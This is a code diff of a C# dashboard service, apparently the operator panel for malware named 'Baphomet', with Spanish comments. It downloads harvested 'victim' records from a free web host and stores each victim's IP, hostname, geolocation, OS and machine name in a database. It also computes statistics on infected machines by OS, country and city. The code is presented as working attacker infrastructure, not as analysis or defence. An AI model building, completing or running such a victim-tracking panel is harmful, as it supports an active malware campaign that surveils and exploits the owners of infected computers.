@@ -1,5 +1,6 @@
 ﻿using BaphoDashBoard.DTO;
 using BaphoDashBoard.Models;
+using Microsoft.EntityFrameworkCore;
 using Newtonsoft.Json;
 using System;
 using System.Collections.Generic;
@@ -8,6 +9,7 @@ using System.Linq;
 using System.Net;
 using System.Security.Cryptography;
 using System.Text;
+using System.Text.RegularExpressions;
 using System.Threading.Tasks;
 
 namespace BaphoDashBoard.DAL.Services
@@ -25,44 +27,75 @@ namespace BaphoDashBoard.DAL.Services
             AppResult result = new AppResult();
             try
             {
-                WebRequest request = WebRequest.Create("https://baphomettest.000webhostapp.com/data.txt");
-                WebResponse response = request.GetResponse();
+                //obtengo la data de las victimas la cual se aloja en nuestro host en formato json
+                WebRequest request =  WebRequest.Create("https://baphomettest.000webhostapp.com/data.txt");
+                WebResponse response =  request.GetResponse();
                 Stream data = response.GetResponseStream();
                 string content = String.Empty;
+                //obtengo todos los records ya guardados en mi DB para luego comparar con la data obtenida, de esta manera no guardo records repetidos.
+                var db_records = await _context.VictimDetail.ToListAsync();
+
                 using (StreamReader sr = new StreamReader(data))
                 {
                     content = sr.ReadToEnd();
-                    var contentObj = JsonConvert.DeserializeObject<List<VictimDetailsDTO>>(content);
-                    if (contentObj != null)
+                    //Creo un array de cada objeto(cada modelo de informacion de mi victima).
+                    //Debido a que este no viene como un json debemos anadirle algunos caracteres para que si lo sea.
+                    var json_string = content.Replace("}", "},").Remove(content.Length - 0);
+                    json_string = "[" + json_string + "]";
+                    var object_array = JsonConvert.DeserializeObject<List<VictimDetailsDTO>>(json_string);
+                    //Una vez tengo mi lista de victimas paso a rrecorerla una a una para saber que record guardo y cual no.
+                    foreach (var victim_object in object_array)
                     {
-                        foreach (var victimInfo in contentObj)
-                        {
-                            string[] Ubication = victimInfo.Localitation.Split(",");
-                            VictimDetail victim = new VictimDetail()
+                        if(victim_object != null)
+                        { 
+                            var record_exist = false;
+                            //Verifico si el record de esta victima ya existe en mi base de datos.
+                            foreach(var db_record in db_records)
                             {
-                                Ip = victimInfo.Ip,
-                                Hostname = victimInfo.Hostname,
-                                City = victimInfo.City,
-                                Region = victimInfo.Region,
-                                Country = victimInfo.Country,
-                                Lat = Ubication[0],
-                                Lng = Ubication[1],
-                                PostalCode = victimInfo.PostalCode,
-                                MachineOS = victimInfo.MachineOs,
-                                MachinName = victimInfo.MachineName
+                                var unique_id = victim_object.MachineName;
+                                if(db_record.MachinName == unique_id)
+                                {
+                                    record_exist = true;
+                                    break;
+                                }
+                            }
+                            //Si el record es false, significa que no existe. Entonces procedo a guardar la info.
+                            if(record_exist == false)
+                            {
+                                var victimInfo = victim_object;
+                                if (victimInfo != null)
+                                {
+                                    string[] Ubication = victimInfo.Localitation.Split(",");
+                                    VictimDetail victim = new VictimDetail()
+                                    {
+                                        Ip = victimInfo.Ip,
+                                        Hostname = victimInfo.Hostname,
+                                        City = victimInfo.City,
+                                        Region = victimInfo.Region,
+                                        Country = victimInfo.Country,
+                                        Lat = Ubication[0],
+                                        Lng = Ubication[1],
+                                        PostalCode = victimInfo.PostalCode,
+                                        MachineOS = victimInfo.MachineOs,
+                                        MachinName = victimInfo.MachineName
+                                    };
+                                    _context.VictimDetail.Add(victim);
+                                    _context.SaveChanges();
 
-                            };
-                            _context.VictimDetail.Add(victim);
-                            _context.SaveChanges();
-
-                            result.success = true;
-                            result.message = "Updated Data";
+                                    result.success = true;
+                                    result.message = "Updated Data";
+                                }
+                                else
+                                {
+                                    result.success = false;
+                                    result.message = "No new data found";
+                                }
+                            }
                         }
-                    }
-                    else
-                    {
-                        result.success = false;
-                        result.message = "No new data found";
+                        else
+                        {
+                            Console.WriteLine("object null");
+                        }
                     }
                 }
             }
@@ -74,12 +107,41 @@ namespace BaphoDashBoard.DAL.Services
             return result;
         }
 
-        public async Task<AppResult<VictimDetail>> GetVictimData()
+        public async Task<AppResult<VictimsHomeInfoDTO>> GetVictimData()
         {
-            AppResult<VictimDetail> result = new AppResult<VictimDetail>();
+            AppResult<VictimsHomeInfoDTO> result = new AppResult<VictimsHomeInfoDTO>();
             try
             {
+                var query = await _context.VictimDetail.ToListAsync();
+                var microsoft_reference = new[] {"Windows", "windows","Microsoft","mocrisoft"};
+                var linux_refrence = new[] {"Linux","linux"};
 
+                foreach (var victim_info in query)
+                {
+                    VictimDetailsDTO victim = new VictimDetailsDTO()
+                    {
+                        Id = victim_info.Id,
+                        Ip = victim_info.Ip,
+                        Hostname = victim_info.Hostname,
+                        City = victim_info.City,
+                        Region = victim_info.Region,
+                        Country = victim_info.Country,
+                        Latitude = victim_info.Lat,
+                        Longitude = victim_info.Lng,
+                        PostalCode = victim_info.PostalCode,
+                        MachineOs = victim_info.MachineOS,
+                        MachineName = victim_info.MachinName
+                    };
+                    result.MRObject.VictimDetails.Add(victim);
+                }
+
+                result.MRObject.WindowsOS = query.Where(x => microsoft_reference.Contains(x.MachineOS)).Count();
+                result.MRObject.LinuxOs = query.Where(x => linux_refrence.Contains(x.MachineOS)).Count();//debo verificar esto ya que no llega nada
+                result.MRObject.Countries = query.GroupBy(x => x.Country).Select(s => s.First()).Count();
+                result.MRObject.Cities = query.GroupBy(x => x.City).Select(s => s.First()).Count();
+                result.MRObject.Machines = query.Count;
+                result.MRObject.Alldata = result.MRObject.VictimDetails;
+                 
             }
             catch(Exception ex)
             {
